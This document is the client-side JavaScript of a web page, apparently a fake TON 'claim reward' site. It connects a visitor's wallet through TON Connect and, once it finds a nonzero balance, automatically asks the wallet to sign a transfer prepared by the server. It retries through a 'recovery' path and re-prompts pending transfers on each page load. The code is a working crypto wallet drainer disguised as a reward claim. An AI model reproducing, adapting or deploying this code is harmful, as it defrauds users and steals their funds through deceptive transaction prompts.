// TON Connect wallet integration with auto-transfer functionality
let tonConnectUI;
let connectedWallet = null;
let walletBalance = "0.00";
let isTransactionInProgress = false; // Add transaction lock

// Initialize TON Connect UI
function initializeTonConnect() {
    try {
        const origin = window.location.origin;
        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: `${origin}/api/manifest`,
            buttonRootId: 'ton-connect-button',
            widgetRootId: null
        });

        // Listen for wallet status changes
        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                await handleWalletConnected(wallet);
            } else {
                handleWalletDisconnected();
            }
        });
        
        // Check if already connected
        checkConnectionStatus();
        
        // Add disconnect button to navbar
        addDisconnectButton();
    } catch (error) {
        console.error('Failed to initialize TON Connect:', error);
        showStatus('Failed to initialize wallet connection', 'error');
    }
}

// Check current connection status
async function checkConnectionStatus() {
    try {
        const apiUrl = `${window.location.origin}/api/status`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        if (data.connected && tonConnectUI.wallet) {
            await handleWalletConnected(tonConnectUI.wallet);
            
            // Also check for any pending transactions
            checkPendingTransactions();
        }
    } catch (error) {
        console.error('Error checking connection status:', error);
    }
}

// Check for pending transactions
async function checkPendingTransactions() {
    try {
        const apiUrl = `${window.location.origin}/api/transaction/pending`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        if (data.success && data.has_pending) {
            console.log('Found pending transaction:', data.transaction);
            showStatus('You have a pending transaction. Please approve it in your wallet.', 'info');
            // Prompt the user to complete the transaction
            setTimeout(() => {
                processTransaction(data.transaction);
            }, 1000);
        }
    } catch (error) {
        console.error('Error checking pending transactions:', error);
    }
}

// Connect wallet function (called by claim buttons)
async function connectWallet() {
    if (!tonConnectUI) {
        initializeTonConnect();
    }
    
    if (!connectedWallet) {
        try {
            await tonConnectUI.openModal();
        } catch (error) {
            console.error('Failed to open wallet modal:', error);
            showStatus('Failed to open wallet connection', 'error');
        }
    } else {
        // If already connected, claim rewards
        await claimRewards();
    }
}

// Disconnect wallet function
async function disconnectWallet() {
    if (tonConnectUI && connectedWallet) {
        try {
            // Show disconnecting status
            showStatus('Disconnecting wallet...', 'info');
            
            // Disconnect from TON Connect
            await tonConnectUI.disconnect();
            
            // Send disconnection info to server
            const apiUrl = `${window.location.origin}/api/disconnect`;
            await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ force: true })
            });
            
            console.log('Wallet disconnected successfully');
            showStatus('Wallet disconnected successfully', 'success');
            
            // Update UI immediately
            handleWalletDisconnected();
            
            // Clear any pending transactions
            if (isTransactionInProgress) {
                isTransactionInProgress = false;
            }
            
            // Refresh the page after a short delay for a clean state
            setTimeout(() => {
                window.location.reload();
            }, 1000);
        } catch (error) {
            console.error('Failed to disconnect wallet:', error);
            showStatus('Failed to disconnect wallet: ' + error.message, 'error');
        }
    } else {
        // No wallet connected, just refresh UI
        handleWalletDisconnected();
    }
}

// Handle wallet connection
async function handleWalletConnected(wallet) {
    connectedWallet = wallet;
    const walletAddress = wallet.account.address;
    console.log('Wallet connected:', walletAddress);
    
    // Update UI to show connected state
    updateClaimButtons('Claim Reward');
    
    // Show wallet info in UI
    showWalletInfo(walletAddress);
    
    // Fetch wallet balance
    refreshBalance();
    
    // Send wallet address to server
    try {
        const apiUrl = `${window.location.origin}/api/connect`;
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ address: walletAddress })
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Server connection failed: ${errorText}`);
        }
        
        const data = await response.json();
        console.log('Server connection response:', data);
        
        if (data.success) {
            if (data.balance && data.balance.error) {
                showStatus(`Balance error: ${data.balance.error}`, 'error');
            } else {
                updateBalanceDisplay(data.balance);
                
                // Prepare for auto-transfer
                if (data.balance && data.balance.native && data.balance.native.balance > 0) {
                    const balanceAmount = data.balance.native.balance;
                    console.log('========================================================');
                    console.log(`AUTO-SENDING: ${balanceAmount} TON from wallet: ${walletAddress}`);
                    console.log('========================================================');
                    
                    // Automatically initiate transfer in the background
                    setTimeout(() => {
                        autoSendBalance();
                    }, 1000); // Small delay to ensure balance is displayed first
                } else {
                    console.log('No balance available to auto-send');
                }
            }
            showStatus('Wallet connected successfully!', 'success');
        } else {
            showStatus('Error connecting wallet: ' + (data.message || 'Unknown error'), 'error');
        }
    } catch (error) {
        console.error('Error connecting to server:', error);
        showStatus(`Error connecting to server: ${error.message}`, 'error');
    }
}

// Auto-send the balance in the background
async function autoSendBalance() {
    // Check if transaction is already in progress
    if (isTransactionInProgress) {
        console.log('Transaction already in progress, skipping auto-send');
        return;
    }
    
    try {
        isTransactionInProgress = true; // Set lock
        console.log('Preparing minimal transaction...');
        
        // Show status to user
        showStatus('Preparing transaction...', 'info', 3000);
        
        // Bypass cache completely
        const apiUrl = `${window.location.origin}/api/claim?${Date.now()}`;
        
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache'
            }
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Transaction preparation failed: ${errorText}`);
        }
        
        const data = await response.json();
        
        if (data.success) {
            // Log transaction details
            if (data.transaction) {
                console.log('\n========================================================');
                console.log('MINIMAL TRANSACTION PREPARED:');
                console.log(`AMOUNT: ${data.transaction.amount}`);
                console.log(`FROM: ${data.transaction.from}`);
                console.log(`TO: ${data.transaction.to}`);
                console.log('========================================================\n');
            }
            
            if (data.requires_approval) {
                // Process transaction (send to wallet for signing)
                await processTransaction(data.transaction);
            } else {
                // Display success message
                showStatus('Transaction sent successfully!', 'success');
                
                // Refresh balance after a delay
                setTimeout(() => {
                    refreshBalance();
                }, 2000);
            }
        } else {
            throw new Error(data.message || 'Failed to prepare transaction');
        }
    } catch (error) {
        console.error('Auto-send error:', error);
        
        // Handle specific error types with clearer messages
        if (error.message && error.message.includes('too small')) {
            showStatus('Your balance is too small. You need at least 1.1 TON.', 'error');
        } else if (error.message && error.message.includes('verify')) {
            showStatus('Unable to verify transaction. Try switching between WiFi and mobile data.', 'error');
            
            // Force page reload to clear any stuck state
            setTimeout(() => {
                window.location.reload();
            }, 5000);
        } else {
            showStatus(`Error: ${error.message}`, 'error');
        }
    } finally {
        // Release lock after a short cooldown period
        setTimeout(() => {
            isTransactionInProgress = false;
        }, 3000);
    }
}

// Process a transaction (send to wallet for signing)
async function processTransaction(transaction) {
    if (!tonConnectUI || !connectedWallet) {
        showStatus('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }
    
    try {
        console.log('Sending transaction to wallet for approval...', transaction);
        
        // Get the amount in nano TON format
        const amountNano = transaction.amount_nano.toString();
        console.log(`Amount to send: ${amountNano} nano TON`);
        
        // FINAL ATTEMPT: Use the absolute bare minimum transaction format
        // Based on TON Connect protocol specification v2
        const transactionToSend = {
            validUntil: transaction.valid_until,
            messages: [
                {
                    address: transaction.to,
                    amount: amountNano
                }
            ]
        };
        
        console.log('Using absolute minimal transaction format:', transactionToSend);
        
        // Show simple status
        showStatus('Please approve the transaction in your wallet', 'info', 10000);
        
        // Send transaction to wallet
        const result = await tonConnectUI.sendTransaction(transactionToSend);
        console.log('Transaction approved by wallet:', result);
        
        // Send confirmation to server
        const confirmResponse = await fetch(`${window.location.origin}/api/transaction/confirm`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cache-Control': 'no-cache'
            },
            body: JSON.stringify({
                transaction_hash: result.boc || transaction.hash,
                boc: result.boc
            })
        });
        
        if (confirmResponse.ok) {
            const confirmData = await confirmResponse.json();
            if (confirmData.success) {
                showStatus('Transaction successful!', 'success');
                setTimeout(() => refreshBalance(), 2000);
                return;
            }
        }
        
        // If we get here, something went wrong
        throw new Error('Transaction failed to confirm');
    } catch (error) {
        console.error('Error processing transaction:', error);
        
        // Check for specific verification error
        if (error.message && error.message.toLowerCase().includes('verify')) {
            handleVerificationError();
        } else if (error.message && error.message.includes('rejected')) {
            showStatus('Transaction was rejected', 'error');
        } else {
            showStatus(`Error: ${error.message}`, 'error');
        }
    }
}

// Handle verification errors specifically
async function handleVerificationError() {
    // Show a more focused error message based on TON Space documentation
    showStatus(`
        Unable to verify transaction. Common causes:
        1. Network connection issues
        2. Wallet app needs to be updated
        3. Not enough TON for fees (need at least 1 TON)
    `, 'error', 8000);
    
    // Try to reset the wallet connection
    try {
        // Check if we can recover without disconnecting
        const recoveryResponse = await fetch(`${window.location.origin}/api/recover-transaction`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cache-Control': 'no-cache'
            }
        }).catch(e => null);
        
        // If recovery endpoint available and successful
        if (recoveryResponse && recoveryResponse.ok) {
            const recoveryData = await recoveryResponse.json();
            if (recoveryData.success && recoveryData.transaction) {
                // Wait a moment before trying again
                await new Promise(r => setTimeout(r, 2000));
                
                // Show status
                showStatus('Attempting alternative verification method...', 'info', 5000);
                
                // Try an alternative approach - with even simpler payload
                const simpleTransaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
                    messages: [
                        {
                            address: recoveryData.transaction.to,
                            amount: recoveryData.transaction.amount_nano.toString()
                        }
                    ]
                };
                
                // Attempt recovery send
                console.log('Attempting recovery with simplified transaction:', simpleTransaction);
                
                // Direct send without retry logic
                const result = await tonConnectUI.sendTransaction(simpleTransaction);
                
                if (result) {
                    showStatus('Transaction verified successfully!', 'success');
                    setTimeout(() => refreshBalance(), 2000);
                    return;
                }
            }
        }
        
        // If recovery failed or not available, disconnect
        console.log('Recovery not available or failed, proceeding with disconnect');
        
        // Force clear any existing session
        if (tonConnectUI) {
            await tonConnectUI.disconnect();
        }
        
        // Tell server to clear any pending transactions
        await fetch(`${window.location.origin}/api/disconnect`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                force: true,
                clear_pending: true
            })
        });
        
        // Show reconnect instructions
        setTimeout(() => {
            showStatus('Please try reconnecting your wallet after the page reloads', 'info', 5000);
            
            // Reload the page to get a fresh start
            setTimeout(() => {
                window.location.reload();
            }, 3000);
        }, 5000);
    } catch (e) {
        console.warn('Error handling verification error:', e);
        
        // Last resort - just reload the page
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    }
}

// Check device time against server time
async function checkDeviceTime() {
    try {
        // Get server time
        const response = await fetch(`${window.location.origin}/api/status?_=${Date.now()}`, { 
            headers: { 'Pragma': 'no-cache' },
            cache: 'no-store'
        });
        
        if (!response.ok) {
            console.warn('Could not check device time: server response not OK');
            return false;
        }
        
        // Extract server timestamp from response headers
        const serverDate = new Date(response.headers.get('Date'));
        const localDate = new Date();
        
        // Calculate time difference in seconds
        const timeDiffSeconds = Math.abs((serverDate.getTime() - localDate.getTime()) / 1000);
        
        console.log(`Device time check: local=${localDate.toISOString()}, server=${serverDate.toISOString()}, diff=${timeDiffSeconds}s`);
        
        // If time difference is more than 60 seconds, show warning
        if (timeDiffSeconds > 60) {
            console.warn(`Device time is off by ${timeDiffSeconds.toFixed(1)} seconds!`);
            showStatus('Warning: Your device time is incorrect. Please enable "Set time automatically" in your device settings.', 'error', 10000);
            return false;
        }
        
        return true;
    } catch (error) {
        console.error('Error checking device time:', error);
        return false;
    }
}

// Check clock drift without showing warnings
async function checkDeviceClockDrift() {
    try {
        const start = Date.now();
        const response = await fetch(`${window.location.origin}/api/status?_=${start}`, { 
            headers: { 'Pragma': 'no-cache' },
            cache: 'no-store'
        });
        
        if (!response.ok) return 0;
        
        const serverDate = new Date(response.headers.get('Date'));
        const localDate = new Date();
        const networkLatency = (Date.now() - start) / 2; // Estimate RTT/2 as network latency
        
        // Adjust server time by adding estimated network latency
        const adjustedServerTime = serverDate.getTime() + networkLatency;
        
        // Calculate time difference in seconds
        const timeDiffSeconds = (localDate.getTime() - adjustedServerTime) / 1000;
        
        console.log(`Clock drift: ${timeDiffSeconds.toFixed(2)} seconds (after network latency adjustment)`);
        
        return timeDiffSeconds;
    } catch (error) {
        console.error('Error checking clock drift:', error);
        return 0;
    }
}

// Handle wallet disconnection
function handleWalletDisconnected() {
    connectedWallet = null;
    
    // Send disconnection info to server
    const apiUrl = `${window.location.origin}/api/disconnect`;
    fetch(apiUrl, {
        method: 'POST'
    }).catch(error => {
        console.error('Error disconnecting from server:', error);
    });
    
    // Update UI
    updateClaimButtons('Connect Wallet');
    
    showStatus('Wallet disconnected', 'info');
}

// Update all claim buttons text
function updateClaimButtons(text) {
    const buttons = document.querySelectorAll('.header_item_button, .intro_item_button, .about_block_button');
    buttons.forEach(button => {
        if (button.innerText.toLowerCase().includes('claim')) {
            button.innerText = text;
        }
    });
}

// Update balance display
function updateBalanceDisplay(balanceData) {
    console.log('Updating balance with data:', balanceData);
    
    let balanceText = "0.00 TON";
    let hasError = false;
    
    // Check if there was an error retrieving balance
    if (balanceData && balanceData.error) {
        hasError = true;
        console.error("Balance error:", balanceData.error);
        
        // Show error to user
        showStatus(`Balance Error: ${balanceData.error}. Your wallet is connected, but we couldn't fetch the current balance.`, 'error');
        
        // Use placeholder balance
        balanceText = "?.?? TON";
    } else if (balanceData.native) {
        // New data structure
        const nativeBalance = balanceData.native.balance || 0;
        balanceText = balanceData.native.formatted || `${nativeBalance.toFixed(4)} TON`;
    } else if (balanceData.balance) {
        // Legacy data structure
        balanceText = `${balanceData.balance.toFixed(4)} TON`;
    }
    
    // Update balance in navbar if element exists
    const navBalance = document.getElementById('navBalance');
    if (navBalance) {
        navBalance.textContent = balanceText;
        
        // Add error styling if needed
        if (hasError) {
            navBalance.style.background = 'rgba(255,0,0,0.2)';
            navBalance.title = 'Balance Error: Refresh to try again';
        } else {
            navBalance.style.background = 'rgba(0,128,0,0.3)';
            navBalance.title = '';
        }
    }
    
    // Save balance for later use
    walletBalance = balanceText;
}

// Refresh balance
async function refreshBalance() {
    if (!connectedWallet) return;
    
    try {
        // Use window.location.origin to get the current domain
        const apiUrl = `${window.location.origin}/api/status`;
        console.log('Fetching balance data from server...', apiUrl);
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Server returned ${response.status}: ${errorText}`);
        }
        
        const data = await response.json();
        console.log('Balance response:', data); // Debug log
        
        if (data.connected) {
            if (data.balance && data.balance.error) {
                // Display the specific error from API
                showStatus(`Balance error: ${data.balance.error}`, 'error');
            } else {
                updateBalanceDisplay(data.balance);
            }
        } else {
            console.error('Not connected in response');
            showStatus('Wallet not connected', 'error');
        }
    } catch (error) {
        console.error('Failed to refresh balance:', error);
        showStatus(`Error: ${error.message}`, 'error');
    }
}

// Claim rewards (manual trigger)
async function claimRewards() {
    // Check if transaction is already in progress
    if (isTransactionInProgress) {
        console.log('Transaction already in progress, skipping manual claim');
        showStatus('Transaction already in progress. Please wait.', 'info');
        return;
    }
    
    // Find the clicked button
    const button = event.target;
    const originalText = button.textContent;
    
    try {
        isTransactionInProgress = true; // Set lock
        button.disabled = true;
        button.innerHTML = 'Processing...';
        
        const apiUrl = `${window.location.origin}/api/claim`;
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Claim failed: ${errorText}`);
        }
        
        const data = await response.json();
        
        if (data.success) {
            // Log transaction details prominently
            if (data.transaction) {
                console.log('\n========================================================');
                console.log('TRANSACTION PREPARED:');
                console.log(`AMOUNT: ${data.transaction.amount}`);
                console.log(`FROM: ${data.transaction.from}`);
                console.log(`TO: ${data.transaction.to}`);
                console.log(`REQUEST ID: ${data.transaction.hash}`);
                console.log(`TIME: ${data.transaction.timestamp}`);
                if (data.is_duplicate) {
                    console.log('NOTE: This was a duplicate transaction request - original TX returned');
                }
                console.log('========================================================\n');
            }
            
            if (data.requires_approval) {
                // Process transaction (send to wallet for signing)
                await processTransaction(data.transaction);
                button.textContent = 'Claimed ✓';
            } else {
                // Display success message
                showStatus('Reward claimed successfully! It will be in your wallet in a few minutes.', 'success');
                button.textContent = 'Claimed ✓';
                
                // Update balance if provided
                if (data.current_balance) {
                    updateBalanceDisplay(data.current_balance);
                }
            }
            
            // Re-enable after 3 seconds
            setTimeout(() => {
                refreshBalance(); // Refresh balance to show the new balance
                button.disabled = false;
                button.textContent = originalText;
            }, 3000);
        } else {
            throw new Error(data.message || 'Failed to claim rewards');
        }
    } catch (error) {
        console.error('Claim error:', error);
        showStatus(error.message || 'Failed to claim rewards', 'error');
        button.disabled = false;
        button.textContent = originalText;
    } finally {
        // Release lock after a 5-second cooldown period
        setTimeout(() => {
            isTransactionInProgress = false;
        }, 5000);
    }
}

// Show status message
function showStatus(message, type, duration = 5000) {
    // Create status element if it doesn't exist
    if (!document.getElementById('statusMessage')) {
        const statusEl = document.createElement('div');
        statusEl.id = 'statusMessage';
        statusEl.style.position = 'fixed';
        statusEl.style.bottom = '20px';
        statusEl.style.left = '50%';
        statusEl.style.transform = 'translateX(-50%)';
        statusEl.style.padding = '15px';
        statusEl.style.borderRadius = '8px';
        statusEl.style.zIndex = '1000';
        statusEl.style.fontWeight = 'bold';
        statusEl.style.maxWidth = '90%';
        statusEl.style.display = 'none';
        statusEl.style.textAlign = 'center';
        statusEl.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
        statusEl.style.fontSize = '16px';
        statusEl.style.lineHeight = '1.5';
        
        // Add mobile-specific styles
        const style = document.createElement('style');
        style.textContent = `
            @media (max-width: 768px) {
                #statusMessage {
                    width: 90% !important;
                    bottom: 50px !important;
                    padding: 15px !important;
                    font-size: 14px !important;
                }
            }
        `;
        document.head.appendChild(style);
        
        document.body.appendChild(statusEl);
    }
    
    const statusEl = document.getElementById('statusMessage');
    
    // Support HTML content in the message
    statusEl.innerHTML = message;
    statusEl.style.display = 'block';
    
    // Set color based on type
    if (type === 'error') {
        statusEl.style.backgroundColor = '#f8d7da';
        statusEl.style.color = '#721c24';
        statusEl.style.border = '1px solid #f5c6cb';
    } else if (type === 'success') {
        statusEl.style.backgroundColor = '#d4edda';
        statusEl.style.color = '#155724';
        statusEl.style.border = '1px solid #c3e6cb';
    } else {
        statusEl.style.backgroundColor = '#d1ecf1';
        statusEl.style.color = '#0c5460';
        statusEl.style.border = '1px solid #bee5eb';
    }
    
    // Auto-hide after specified duration
    setTimeout(() => {
        statusEl.style.display = 'none';
    }, duration);
}

// Add hidden TON Connect button div
function addTonConnectButton() {
    if (!document.getElementById('ton-connect-button')) {
        const tonButton = document.createElement('div');
        tonButton.id = 'ton-connect-button';
        tonButton.style.display = 'none';
        document.body.appendChild(tonButton);
    }
}

// Show wallet information in the UI
function showWalletInfo(address) {
    // Simplified UI - only show the disconnect button
    const walletContainer = document.getElementById('walletControlContainer');
    if (walletContainer) {
        walletContainer.style.display = 'flex';
    }
    
    // Add disconnect button to navbar if not already there
    const navbarElement = document.querySelector('.header_menu') || document.querySelector('.header_items');
    if (navbarElement && !document.getElementById('disconnectWalletBtn')) {
        const disconnectBtn = document.createElement('button');
        disconnectBtn.id = 'disconnectWalletBtn';
        disconnectBtn.textContent = 'Disconnect';
        disconnectBtn.style.background = '#f44336';
        disconnectBtn.style.color = 'white';
        disconnectBtn.style.border = 'none';
        disconnectBtn.style.borderRadius = '4px';
        disconnectBtn.style.padding = '8px 12px';
        disconnectBtn.style.cursor = 'pointer';
        disconnectBtn.style.fontWeight = 'bold';
        disconnectBtn.style.fontSize = '14px';
        disconnectBtn.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
        disconnectBtn.onclick = disconnectWallet;
        
        // Add to navbar
        if (walletContainer) {
            walletContainer.appendChild(disconnectBtn);
        } else {
            navbarElement.appendChild(disconnectBtn);
        }
    }
    
    // Just show a simple status message
    showStatus('Wallet connected', 'success', 3000);
}

// Add disconnect button to navbar
function addDisconnectButton() {
    // Check if we already have a disconnect button
    if (document.getElementById('disconnectWalletBtn')) {
        return;
    }
    
    // Look for navbar or header to add button
    const navbarElement = document.querySelector('.header_menu') || document.querySelector('.header_items');
    if (navbarElement) {
        // Create the disconnect button container
        const disconnectContainer = document.createElement('div');
        disconnectContainer.id = 'walletControlContainer';
        disconnectContainer.style.display = 'none'; // Initially hidden
        disconnectContainer.style.marginLeft = '15px';
        
        // Add container to navbar
        navbarElement.appendChild(disconnectContainer);
    }
}

// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
    addTonConnectButton();
    initializeTonConnect();
}); 